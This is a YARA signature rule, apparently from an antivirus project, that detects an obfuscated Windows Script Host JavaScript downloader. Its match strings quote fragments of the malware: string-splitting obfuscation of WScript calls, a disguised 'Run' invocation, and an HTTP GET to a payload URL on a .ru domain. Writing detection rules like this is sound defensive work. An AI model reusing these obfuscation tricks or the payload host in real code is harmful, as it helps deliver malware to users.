rule sig_20160428_bdfa945d4c227340ee40b370d803ea10 {
  meta:
    description = "datamaliciousorder - file 20160428_bdfa945d4c227340ee40b370d803ea10.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cbbcf2b63bcd31632a8e0783ff42a3c6c54f1f7654ef95028fe5bdebf5b991df"

  strings:
    $s1  = "function YieMtdBguHafCroXjhErt() {return NxtMfcEhwBebTrcIjjHzg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function FolWhaTwoShpTkcNkoShh(ZxxMbkTdpWukOivDnvOwx){NxtMfcEhwBebTrcIjjHzg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function FolWhaTwoShpTkcNkoShh(ZxxMbkTdpWukOivDnvOwx){NxtMfcEhwBebTrcIjjHzg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return WifFksGakBckGugPnfEaq - NrsIzvYhaIviVpsRqyCvr;};" fullword ascii
    $s5  = "function MksVzzGdqKfmOzfJsaMhq(WifFksGakBckGugPnfEaq, NrsIzvYhaIviVpsRqyCvr){NxgYtkRwiIkqFwrCxrCii = NxgYtkRwiIkqFwrCxrCii * 1; " ascii
    $s6  = "var NxtMfcEhwBebTrcIjjHzg = function VzhEgsKnzAczLlgFrgUwp() {return EmgCpkTkgRyaUloXccZvq[GdpGoiKlnKsySppIacTtn](\"WScript\"+\"" ascii
    $s7  = "CsvFbzBcnPwlJamTmvSag[OseYfjUlhOsoExyIggBxp](\"G\" + \"ET\", \"http://sar-decor.ru/x8skfa\", false);" fullword ascii
    $s8  = "var EmgCpkTkgRyaUloXccZvq = this[\"WScript\"];" fullword ascii
    $s9  = "var NxtMfcEhwBebTrcIjjHzg = function VzhEgsKnzAczLlgFrgUwp() {return EmgCpkTkgRyaUloXccZvq[GdpGoiKlnKsySppIacTtn](\"WScript\"+\"" ascii
    $s10 = "function YieMtdBguHafCroXjhErt() {return NxtMfcEhwBebTrcIjjHzg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function DveMafFsaPvjNmyRlwHsd(){return ZwiSloOjePunJdwJjyLyz + \"\";};" fullword ascii
    $s12 = "if (CsvFbzBcnPwlJamTmvSag[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function MksVzzGdqKfmOzfJsaMhq(WifFksGakBckGugPnfEaq, NrsIzvYhaIviVpsRqyCvr){NxgYtkRwiIkqFwrCxrCii = NxgYtkRwiIkqFwrCxrCii * 1; " ascii
    $s14 = "function HskSlrPglMubUwcUlbKrm() {return ((SkjSbnCycEvvMtkFflPzt == true) && (SkjSbnCycEvvMtkFflPzt == HveLaoMrgWylXjkZfrOkq)) ?" ascii
    $s15 = "function HskSlrPglMubUwcUlbKrm() {return ((SkjSbnCycEvvMtkFflPzt == true) && (SkjSbnCycEvvMtkFflPzt == HveLaoMrgWylXjkZfrOkq)) ?" ascii
    $s16 = "function ClzUzyGmwPebOwnIonVge(){return 23;};" fullword ascii
    $s17 = "function SenYwvSqaLpzMekBiaVml()" fullword ascii
    $s18 = "}while (GzhOnuUfqKgiZmkJhkZps);" fullword ascii
    $s19 = "var HehRkjCsdRrsLxsKbtTwe = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "YxhObcPtxGksFizTgcLpx = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}